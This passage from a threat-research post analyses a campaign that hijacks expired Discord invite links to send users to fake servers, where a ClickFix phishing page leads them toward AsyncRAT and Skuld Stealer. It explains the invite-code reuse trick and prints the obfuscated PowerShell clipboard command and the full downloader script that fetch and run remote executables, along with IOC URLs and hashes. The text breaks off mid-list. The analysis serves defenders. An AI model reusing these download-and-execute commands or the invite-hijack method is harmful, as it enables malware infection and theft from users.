-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31477" height="253" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-1-Generating-a-random-invite-code-in-Discord-application.png" width="453" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 1&lt;/strong&gt; &amp;#8211; Generating a random invite code in Discord application.&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;2. Permanent Invite Links:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;These are created by explicitly selecting the&amp;nbsp;&amp;#8220;Expire After:&amp;nbsp;Never&amp;#8221;&amp;nbsp;option.&amp;nbsp;Codes generated for permanent invites contain 10 randomly-generated alphanumeric characters&amp;nbsp;(uppercase,&amp;nbsp;lowercase,&amp;nbsp;numbers).&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31478" height="418" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-2-Generating-a-permanent-invite-link-in-Discord-application.png" width="453" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 2&lt;/strong&gt; &amp;#8211; Generating a permanent invite link in Discord application.&lt;/p&gt;
-
-
-
-&lt;p&gt;Example of permanent invite link:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;strong&gt;https://discord.gg/wAYq5GAsyH&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;3. Custom Vanity Invite Links:&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;These are exclusively available to Discord servers with a premium subscription&amp;nbsp;(Level 3 Boost).&amp;nbsp;Vanity invite links allow server administrators to manually select the invite code,&amp;nbsp;provided it is unique across all Discord servers.&amp;nbsp;Codes may contain lowercase letters,&amp;nbsp;numbers,&amp;nbsp;or dashes,&amp;nbsp;and all letters are automatically converted to lowercase.&amp;nbsp;A server can only have one vanity link at a time.&amp;nbsp;If a server loses its boosts,&amp;nbsp;its custom vanity link becomes available for reuse by another boosted server.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Invite Code Reuse and Exploitation&lt;/h2&gt;
-
-
-
-&lt;p&gt;When creating a regular randomly-generated invite link,&amp;nbsp;after it’s expired or deleted,&amp;nbsp;you cannot obtain the same invite link again.&amp;nbsp;Invite codes are generated randomly and the probability of generating the same exact invite code is extremely low.&lt;/p&gt;
-
-
-
-&lt;p&gt;However,&amp;nbsp;the mechanism for creating custom invite links surprisingly lets you reuse expired temporary invite codes,&amp;nbsp;and,&amp;nbsp;in some cases,&amp;nbsp;deleted permanent invite codes:&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31479" height="318" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-3-Assigning-a-previously-used-invite-code-from-another-server-as-a-custom-vanity-invite-link-for-a-boosted-server-in-Discord-application.png" width="704" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 3&lt;/strong&gt; &amp;#8211; Assigning a previously used invite code from another server as a custom vanity invite link for a boosted server in Discord application.&lt;/p&gt;
-
-
-
-&lt;p&gt;Attackers actively exploit this behavior.&amp;nbsp;Once a temporary invite expires,&amp;nbsp;its code can be registered as a custom invite for another Discord server that has Level 3 Boost.&amp;nbsp;If a legitimate Discord server uses a custom vanity link but later loses its boost status&amp;nbsp;(for example,&amp;nbsp;due to a missed subscription payment),&amp;nbsp;the vanity invite becomes available again,&amp;nbsp;and attackers can claim it for their own malicious server.&amp;nbsp;This creates a serious risk:&amp;nbsp;Users who follow previously trusted invite links&amp;nbsp;(e.g.,&amp;nbsp;on websites,&amp;nbsp;blogs,&amp;nbsp;or forums)&amp;nbsp;can unknowingly be redirected to fake Discord servers created by threat actors.&lt;/p&gt;
-
-
-
-&lt;p&gt;The safest option is to use permanent invites,&amp;nbsp;which are more resistant to hijacking.&amp;nbsp;In particular,&amp;nbsp;if a permanent invite code contains any uppercase letters,&amp;nbsp;it cannot be reused even after deletion.&amp;nbsp;However,&amp;nbsp;in rare cases,&amp;nbsp;if a deleted permanent invite consisted only of lowercase letters and digits&amp;nbsp;(about 0.44%&amp;nbsp;of all cases),&amp;nbsp;the code may become available again for registration as a vanity invite.&lt;/p&gt;
-
-
-
-&lt;p&gt;The table below summarizes the hijack risk for each type of invite:&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;strong&gt;Invite type&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Can be hijacked?&lt;/strong&gt;&lt;/th&gt;&lt;th&gt;&lt;strong&gt;Explanation&lt;/strong&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;Temporary Invite Link&lt;/td&gt;&lt;td&gt;&lt;img alt="✅" class="wp-smiley" src="https://s.w.org/images/core/emoji/16.0.1/72x72/2705.png" style="height: 1em;" /&gt; Yes&lt;/td&gt;&lt;td&gt;After expiration, the code becomes available and can be re-registered as a custom vanity URL by a different server with Level 3 Boost.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Permanent Invite Link&lt;/td&gt;&lt;td&gt;&lt;img alt="⚠" class="wp-smiley" src="https://s.w.org/images/core/emoji/16.0.1/72x72/26a0.png" style="height: 1em;" /&gt; Conditional&lt;/td&gt;&lt;td&gt;If deleted, a code with only lower-case letters and digits can be re-registered as a custom vanity URL by a different server with Level 3 Boost.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Custom Vanity Invite&lt;/td&gt;&lt;td&gt;&lt;img alt="✅" class="wp-smiley" src="https://s.w.org/images/core/emoji/16.0.1/72x72/2705.png" style="height: 1em;" /&gt; Yes (if lost)&lt;/td&gt;&lt;td&gt;If the original server loses its Level 3 Boost status, the vanity invite becomes invalid and may be claimed by another boosted server.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
-
-
-
-&lt;p&gt;In both the Web and desktop versions of the Discord client,&amp;nbsp;the invite code management behavior creates an additional risk factor.&amp;nbsp;When users create a new temporary invite through the&amp;nbsp;&amp;#8220;Invite People&amp;#8221;&amp;nbsp;option in the server’s menu and check the box&amp;nbsp;&amp;#8220;Set this link to never expire,&amp;#8221;&amp;nbsp;it does not modify the expiration time of &lt;em&gt;an already generated temporary invite&lt;/em&gt;.&amp;nbsp;The figure below shows how,&amp;nbsp;when you click the&amp;nbsp;&amp;#8220;Set this link to never expire&amp;#8221;&amp;nbsp;checkbox,&amp;nbsp;the Discord client shows that the link settings have supposedly changed,&amp;nbsp;but the invite code remains temporary&amp;nbsp;(as we can see,&amp;nbsp;it consists of 8 characters).&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31480" height="255" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-4-When-you-set-Never-Expires-for-an-existing-link-its-expiration-settings-do-not-actually-change.png" width="451" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 4&lt;/strong&gt; &amp;#8211; When you set&amp;nbsp;&amp;#8220;Never Expires&amp;#8221;&amp;nbsp;for an existing link,&amp;nbsp;its expiration settings do not actually change.&lt;/p&gt;
-
-
-
-&lt;p&gt;Users often mistakenly believe that by simply checking this box,&amp;nbsp;they have made the existing invite permanent&amp;nbsp;(and it was this misunderstanding that was exploited in the attack we observed).&amp;nbsp;As a result,&amp;nbsp;temporary invites are published under the false assumption that they will never expire.&amp;nbsp;These links eventually expire without warning,&amp;nbsp;making their codes vulnerable to hijacking and malicious reuse.&lt;/p&gt;
-
-
-
-&lt;h3 class="wp-block-heading"&gt;Examples&lt;/h3&gt;
-
-
-
-&lt;p&gt;Let’s explore how attackers can hijack Discord invite links under different conditions.&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;Case 1: Temporary invite with only lowercase letters and digits&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;Let’s say a legitimate server shares an invite link like: &lt;code&gt;https://discord.gg/yzqks3d&lt;/code&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;This code contains only lowercase letters and digits.&amp;nbsp;As long as the invite is active,&amp;nbsp;attackers cannot register it as a vanity invite.&amp;nbsp;However,&amp;nbsp;once the invite expires or is manually deleted,&amp;nbsp;the code becomes available.&amp;nbsp;Attackers monitoring known invite codes can then quickly claim it as a vanity invite on a malicious boosted server.&amp;nbsp;From that point on,&amp;nbsp;anyone using this invite&amp;nbsp;(&lt;code&gt;yzqks3d&lt;/code&gt;)&amp;nbsp;will be redirected to the attacker&amp;#8217;s server.&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;Case 2: Temporary invite with uppercase letters&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;Now let’s consider another invite code: &lt;code&gt;https://discord.gg/uzwgPxUZ&lt;/code&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;This code includes uppercase letters.&amp;nbsp;In this case,&amp;nbsp;attackers can register a vanity invite using the lowercase version of the same code&amp;nbsp;(&lt;code&gt;uzwgpxuz&lt;/code&gt;)&amp;nbsp;even while the original invite is still active.&amp;nbsp;Discord allows it because vanity codes are always stored and compared in lowercase.&lt;/p&gt;
-
-
-
-&lt;p&gt;While the original invite is still valid,&amp;nbsp;users who follow the link will land on the correct server.&amp;nbsp;But as soon as this invite expires,&amp;nbsp;users clicking the previously legitimate link&amp;nbsp;(&lt;code&gt;uzwgPxUZ&lt;/code&gt;)&amp;nbsp;are seamlessly redirected to the attackers’ server,&amp;nbsp;which now owns the lowercase vanity version of that code.&lt;/p&gt;
-
-
-
-&lt;p&gt;Note that&amp;nbsp;if the original invite that includes uppercase letters is manually deleted before its expiration,&amp;nbsp;Discord continues to treat the code as reserved until the scheduled expiration time is reached.&amp;nbsp;The users following the original link&amp;nbsp;(&lt;code&gt;uzwgPxUZ&lt;/code&gt;)&amp;nbsp;won’t be redirected to the attacker’s server until then.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;From Trusted Links to Malicious Discord Servers&lt;/h2&gt;
-
-
-
-&lt;p&gt;Using the method described above,&amp;nbsp;attackers hijack Discord invite links originally shared by legitimate communities.&amp;nbsp;Users following these trusted links,&amp;nbsp;found in social media posts&amp;nbsp;or official community websites,&amp;nbsp;unknowingly end up on malicious servers carefully designed to look authentic.&lt;/p&gt;
-
-
-
-&lt;p&gt;Upon joining,&amp;nbsp;new members typically see that most channels are locked&amp;nbsp;and only one channel, usually named “&lt;strong&gt;verify&lt;/strong&gt;”, is accessible.&amp;nbsp;In this channel,&amp;nbsp;a bot named&amp;nbsp;”&lt;strong&gt;Safeguard”&lt;/strong&gt;&amp;nbsp;prompts users to complete a verification step to gain full server access.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31481" height="899" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-5-Malicious-Discord-server-where-users-land-after-clicking-a-hijacked-invite-link.png" width="1407" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 5&lt;/strong&gt; &amp;#8211; Malicious Discord server where users land after clicking a hijacked invite link.&lt;/p&gt;
-
-
-
-&lt;p&gt;Inspecting the bot&amp;#8217;s information reveals that the malicious bot&amp;nbsp;&amp;#8220;&lt;strong&gt;Safeguard#0786&lt;/strong&gt;&amp;#8221;&amp;nbsp;was created on February 1,&amp;nbsp;2025:&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31482" height="435" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-6-Malicious-Safeguard-bot-description.png" width="609" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 6&lt;/strong&gt; &amp;#8211; Malicious&amp;nbsp;“Safeguard”&amp;nbsp;bot description.&lt;/p&gt;
-
-
-
-&lt;p&gt;When users click the&amp;nbsp;“&lt;strong&gt;verify&lt;/strong&gt;”&amp;nbsp;button,&amp;nbsp;they&amp;#8217;re asked to authorize the bot,&amp;nbsp;redirecting them to an external website:&amp;nbsp;&lt;code&gt;https://captchaguard[.]me&lt;/code&gt;.&amp;nbsp;At the same time,&amp;nbsp;the bot obtains access to user profile details,&amp;nbsp;such as username,&amp;nbsp;avatar,&amp;nbsp;and banner.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31483" height="759" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-7-Safeguard-bot-redirecting-users-to-phishing-site-captchaguard_me.png" width="576" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 7&lt;/strong&gt; &amp;#8211; Safeguard bot redirecting users to the phishing website.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Phishing website&lt;/h2&gt;
-
-
-
-&lt;p&gt;After the user authorizes the bot,&amp;nbsp;Discord starts the OAuth2 authentication flow.&amp;nbsp;Discord generates a single use code and the URL with a format such as&amp;nbsp;&lt;code&gt;https://captchaguard.me/oauth-pass?code=zyA11weHhTZxaY3Fs3EWBg6qfO7t6j&lt;/code&gt;&amp;nbsp;is opened in the browser.&amp;nbsp;At the same time,&amp;nbsp;using this code,&amp;nbsp;the website gets the username and the server name from Discord.&amp;nbsp;After successfully retrieving user data from Discord,&amp;nbsp;the server redirects the user to another URL with the format:&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;https://captchaguard[.]me/?key=aWQ9dXNlcm5hbWUyMzQ0JnRva2VuPTExMjIzMzQ0MDEyMz&amp;#8230;&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;In this URL,&amp;nbsp;the&amp;nbsp;“key”&amp;nbsp;variable contains BASE64-encoded data retrieved from Discord that includes the username,&amp;nbsp;Discord guild, and icon IDs.&amp;nbsp;The page is static and does not actually verify the data received in the&amp;nbsp;“key=”&amp;nbsp;variable.&amp;nbsp;Therefore,&amp;nbsp;anyone can open it using the empty value:&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;https://captchaguard[.]me/?key=&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;Once redirected,&amp;nbsp;the user is shown a well-designed web page mimicking Discord’s UI.&amp;nbsp;At the center is a&amp;nbsp;“&lt;strong&gt;Verify&lt;/strong&gt;”&amp;nbsp;button,&amp;nbsp;accompanied by a green shield logo.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31484" height="433" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-8-Phishing-website-with-fake-verification-message.png" width="596" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 8&lt;/strong&gt; &amp;#8211; Phishing website displaying a fake verification message.&lt;/p&gt;
-
-
-
-&lt;p&gt;Clicking&amp;nbsp;&amp;#8220;&lt;strong&gt;Verify&lt;/strong&gt;&amp;#8221;&amp;nbsp;executes JavaScript that silently copies a malicious PowerShell command to the user’s clipboard:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';$u=($r[-1..-($r.Length)]-join '');$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));iex (iwr -Uri $url)"
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;The attackers use a refined UX trick known as&amp;nbsp;&lt;strong&gt;“ClickFix”,&lt;/strong&gt;&amp;nbsp;&amp;nbsp;a technique in which the service initially appears broken,&amp;nbsp;prompting the user to take manual action to&amp;nbsp;“fix”&amp;nbsp;it.&amp;nbsp;In this case,&amp;nbsp;a fake Google CAPTCHA is shown as failing to load,&amp;nbsp;and manual&amp;nbsp;“verification”&amp;nbsp;instructions are displayed.&lt;/p&gt;
-
-
-
-&lt;p&gt;This page presents a sequence of clear,&amp;nbsp;visually guided steps to pass&amp;nbsp;“verification”:&amp;nbsp;open the Windows Run dialog&amp;nbsp;(&lt;code&gt;Win + R&lt;/code&gt;),&amp;nbsp;paste the text preloaded into the clipboard,&amp;nbsp;and press Enter.&amp;nbsp;The site avoids asking users to download or run any files manually,&amp;nbsp;removing a common red flag.&amp;nbsp;By using familiar Discord visuals and a polished layout,&amp;nbsp;the attackers create a false sense of legitimacy.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31485" height="849" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-9-Social-engineering-technique-tricking-a-user-to-execute-a-malicious-command.png" width="840" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 9&lt;/strong&gt; &amp;#8211; Social engineering technique tricking a user to execute a malicious command.&lt;/p&gt;
-
-
-
-&lt;p&gt;In reality,&amp;nbsp;this action causes the user’s computer to download and execute a PowerShell script hosted on Pastebin:&lt;/p&gt;
-
-
-
-&lt;p&gt;&lt;strong&gt;https://pastebin[.]com/raw/zW0L2z2M&lt;/strong&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;Pastebin is a public web service where users can store and share plain text online,&amp;nbsp;and is often used for sharing code snippets,&amp;nbsp;logs,&amp;nbsp;or configuration data.&amp;nbsp;When you create a new&amp;nbsp;“paste”,&amp;nbsp;it becomes accessible via a short link like&amp;nbsp;“&lt;code&gt;https://pastebin[.]com/raw/{resource_id}&lt;/code&gt;”.&amp;nbsp;Usually,&amp;nbsp;it does not require registration to share some data.&amp;nbsp;Registered users have the ability to delete and edit data they previously posted.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Multi-stage Payload Delivery Using Pastebin, GitHub and Bitbucket&lt;/h2&gt;
-
-
-
-&lt;p&gt;The malware campaign we uncovered in our research follows a carefully designed multi-stage infection chain.&amp;nbsp;Threat actors leverage a combination of Discord,&amp;nbsp;phishing websites,&amp;nbsp;social engineering,&amp;nbsp;public services like Pastebin,&amp;nbsp;and cloud platforms such as GitHub and Bitbucket to deliver their payloads.&lt;/p&gt;
-
-
-
-&lt;p&gt;The diagram below summarizes the initial phase, which involves phishing via hijacked Discord invites and the ClickFix technique detailed above:&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31486" height="169" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-10-Infection-chain-overview-From-hijacked-Discord-invite-to-execution-of-PowerShell-downloader-1024x169.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p&gt;&lt;strong&gt;Figure 10&lt;/strong&gt; &amp;#8211; Infection chain overview:&amp;nbsp;From hijacked Discord invite to execution of PowerShell downloader.&lt;/p&gt;
-
-
-
-&lt;p&gt;At the conclusion of this phase, a PowerShell script is executed on the victim’s machine. This script downloads and runs a first-stage downloader (&lt;strong&gt;installer.exe&lt;/strong&gt;) from GitHub, initiating the next phase of the attack.&lt;/p&gt;
-
-
-
-&lt;p&gt;The script executed at the end of this phase downloads and runs a first-stage downloader (&lt;strong&gt;installer.exe&lt;/strong&gt;) from GitHub, initiating the next stage of the attack. This stage involves multiple loaders and payloads retrieved from Bitbucket, ultimately deploying malicious payloads, including AsyncRAT and Skuld Stealer:&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31488" height="588" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-11-Infection-chain-overview-From-PowerShell-to-final-malware-payload-delivery-1024x588.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 11&lt;/strong&gt; &amp;#8211; Infection chain overview: From PowerShell to final malware payload delivery.&lt;/p&gt;
-
-
-
-&lt;p&gt;Let’s now examine each component of the second-phase in detail.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;Downloader PowerShell Script&lt;/h2&gt;
-
-
-
-&lt;p&gt;The script download from Pastebin link is not obfuscated or encrypted.&amp;nbsp;From its code we can see that it downloads and runs an executable file from a GitHub URL:&lt;/p&gt;
-
-
-
-&lt;pre class="EnlighterJSRAW"&gt;# Hide PowerShell Console Window
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class Win32 {
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetConsoleWindow();
-}
-"@
-$consolePtr = [Win32]::GetConsoleWindow()
-[Win32]::ShowWindow($consolePtr, 0)  # Hide the console window
-
-# Define the download and execution parameters
-$url = "https://github.com/frfs1/update/raw/refs/heads/main/installer.exe"  # Direct EXE download
-$exePath = Join-Path $env:TEMP ('installer.exe')
-
-try {
-    Write-Output "Establishing connection..."
-
-    # Download the EXE using WebClient
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($url, $exePath)
-
-    # Validate the download
-    if (-not (Test-Path $exePath) -or ((Get-Item $exePath).length -eq 0)) {
-        Write-Output "failed. Exiting..."
-        exit 1
-    }
-
-    # Run the executable
-	Start-Process -FilePath $exePath -ArgumentList "-arg1" -NoNewWindow
-
-} catch {
-    Write-Output "An error occurred"
-} finally {
-    Write-Output "unable to detect discord session."
-}
-&lt;/pre&gt;
-
-
-
-&lt;p&gt;We noticed that almost no anti-virus vendors flag this script as malicious:&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31487" height="148" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-12-Malicious-PowerShell-script-has-an-extremely-low-detection-rate-on-VirusTotal-1024x148.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 12&lt;/strong&gt; &amp;#8211; Malicious PowerShell script has an extremely low detection rate on VirusTotal.&lt;/p&gt;
-
-
-
-&lt;p&gt;Cybercriminals actively use the ability to edit information posted on Pastebin to change the GitHub URL from which the executable file is downloaded.&amp;nbsp;This probably allows them to bypass the blocking by GitHub.&amp;nbsp;If the repository is deleted,&amp;nbsp;the attackers just create a new account and&amp;nbsp;a new repository,&amp;nbsp;to which they upload the file.&amp;nbsp;The new URL is then placed inside the Pastebin script.&lt;/p&gt;
-
-
-
-&lt;p&gt;While monitoring the campaign,&amp;nbsp;we observed the following changes in the address:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;strong&gt;https://github[.]com/frfs1/update/raw/refs/heads/main/installer.exe&lt;/strong&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;strong&gt;https://github[.]com/shisuh/update/raw/refs/heads/main/installer.exe&lt;/strong&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;strong&gt;https://github[.]com/gkwdw/wffaw/raw/refs/heads/main/installer.exe&lt;/strong&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;strong&gt;https://codeberg[.]org/wfawwf/dwadwaa/raw/branch/main/installer.exe&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h2 class="wp-block-heading"&gt;First Stage Downloader: installer.exe&lt;/h2&gt;
-
-
-
-&lt;p&gt;The downloaded executable&amp;nbsp;&lt;strong&gt;installer.exe&lt;/strong&gt;&amp;nbsp; (SHA256:&amp;nbsp;&lt;strong&gt;673090abada8ca47419a5dbc37c5443fe990973613981ce622f30e83683dc932&lt;/strong&gt;)&amp;nbsp;has extremely low detection rates.&amp;nbsp;At the time of our research,&amp;nbsp;only a single antivirus vendor on VirusTotal flagged it as malicious:&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31489" height="145" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-13-First-Stage-Downloader-has-an-extremely-low-detection-rate-on-VirusTotal-1024x145.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 13&lt;/strong&gt; &amp;#8211; First Stage Downloader has an extremely low detection rate on VirusTotal.&lt;/p&gt;
-
-
-
-&lt;p&gt;During continued monitoring of the campaign,&amp;nbsp;we identified a newer variant of the loader&amp;nbsp;(SHA256:&amp;nbsp;&lt;strong&gt;160eda7ad14610d93f28b7dee20501028c1a9d4f5dc0437794ccfc2604807693&lt;/strong&gt;)&amp;nbsp;that achieved zero detections across all antivirus engines at the time of submission.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31490" height="144" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-14-First-Stage-Downloader-with-zero-detections-on-VirusTotal-1024x144.png" width="1024" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 14&lt;/strong&gt; &amp;#8211; First Stage Downloader with zero detections on VirusTotal.&lt;/p&gt;
-
-
-
-&lt;p&gt;This binary acts as a downloader that retrieves its second-stage payloads from remote servers.&lt;/p&gt;
-
-
-
-&lt;p&gt;Written in C++&amp;nbsp;and approximately 4.8MB in size,&amp;nbsp;the binary is not packed.&amp;nbsp;However,&amp;nbsp;the extensive use of junk code complicates its static analysis.&amp;nbsp;Additionally,&amp;nbsp;C++&amp;nbsp;binaries inherently complicate analysis due to their use of virtual function tables,&amp;nbsp;indirect function calls,&amp;nbsp;and complex runtime structures,&amp;nbsp;making it challenging to quickly identify the relevant code paths.&lt;/p&gt;
-
-
-
-&lt;p&gt;At first glance,&amp;nbsp;the downloader seems to contain plaintext strings;&amp;nbsp;however,&amp;nbsp;nearly all easily visible strings belong to junk code designed to distract analysts.&amp;nbsp;In reality,&amp;nbsp;critical strings related to malicious functionality are concealed by being stored as sequences of immediate values pushed directly onto the stack at runtime.&amp;nbsp;Each string is additionally encrypted using a simple XOR cipher with a single-byte key.&amp;nbsp;A distinct XOR key is used for every encrypted string and loaded into the&amp;nbsp;&lt;code&gt;CL&lt;/code&gt;&amp;nbsp;register typically just before the process of writing encrypted bytes to the stack.&amp;nbsp;The same method is applied to obfuscate important Windows API function names,&amp;nbsp;whose addresses the malware dynamically resolves using&amp;nbsp;&lt;code&gt;GetProcAddress&lt;/code&gt;.&lt;/p&gt;
-
-
-&lt;div class="wp-block-image"&gt;
-&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31491" height="443" src="https://research.checkpoint.com/wp-content/uploads/2025/05/Figure-15-Strings-and-API-calls-obfuscation-in-the-loader.png" width="886" /&gt;&lt;/figure&gt;&lt;/div&gt;
-
-
-&lt;p class="has-text-align-center"&gt;&lt;strong&gt;Figure 15&lt;/strong&gt; &amp;#8211; Strings and API calls obfuscation in the loader.&lt;/p&gt;
-
-
-
-&lt;p&gt;When executed in a sandbox without extra options,&amp;nbsp;the malware does not expose any suspicious functionality.&amp;nbsp;It just performs dozens of junk calls&amp;nbsp;(such as&amp;nbsp;&lt;code&gt;OpenThemeData&lt;/code&gt;,&amp;nbsp;&lt;code&gt;RegisterWindowMessageW&lt;/code&gt;,&amp;nbsp;&lt;code&gt;SHGetStockIconInf&lt;/code&gt;,&amp;nbsp;etc.)&amp;nbsp;and then exits.&lt;/p&gt;
-
-
-
-&lt;p&gt;However,&amp;nbsp;if executed with the command-line parameters&amp;nbsp;”&lt;code&gt;-arg1&lt;/code&gt;&amp;#8221;&amp;nbsp;or&amp;nbsp;”&lt;code&gt;-arg2&lt;/code&gt;&amp;#8220;,&amp;nbsp;it initiates further malicious operations.&amp;nbsp;It&amp;#8217;s noteworthy that the initial PowerShell script described earlier explicitly passes the “&amp;nbsp;&lt;code&gt;-arg1&lt;/code&gt;&amp;#8221;&amp;nbsp;parameter to the executable,&amp;nbsp;triggering its malicious functionality.&lt;/p&gt;
-
-
-
-&lt;p&gt;Upon execution with the correct argument,&amp;nbsp;the dropper creates the following directory: &lt;code&gt;C:\\Users\\%USERNAME%\\AppData\\Local\\ServiceHelper\\&lt;/code&gt;&lt;/p&gt;
-
-
-
-&lt;p&gt;Then,&amp;nbsp;it creates two Visual Basic scripts inside this folder:&lt;/p&gt;
-
-
-
-&lt;ol class="wp-block-list"&gt;
